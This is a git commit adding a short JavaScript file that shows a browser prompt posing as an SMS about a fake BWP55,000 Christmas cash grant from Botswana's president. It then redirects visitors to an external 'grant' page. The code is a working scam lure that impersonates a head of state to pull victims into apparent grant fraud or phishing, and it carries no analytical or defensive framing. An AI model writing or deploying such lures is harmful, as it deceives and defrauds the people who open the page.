d465c6fadef238989a16298035f3e638d6dae66a
boss-bloq <nsisboy01@gmail.com>
2024-12-11 23:23:00 -0800

    Create botswana-active.js

---
+++ botswana-active.js
@@ -0,0 +1,6 @@
+
+var password = 'WITHDRAW BWP55,000'
+password=prompt('SMS: Congratulations You are qualify for President DUMA BOKO BWP55,000 CHRISTMAS CASH GRANT FOR GHANAIANS, Kindly Press OK to Withdraw X-MAS Cash Grant   ','WITHDRAW BWP55,000');
+if (password != 'WITHDRAW BWP55,000') {
+location.href='https://damba-fest.org/botswana-grant.html';
+}
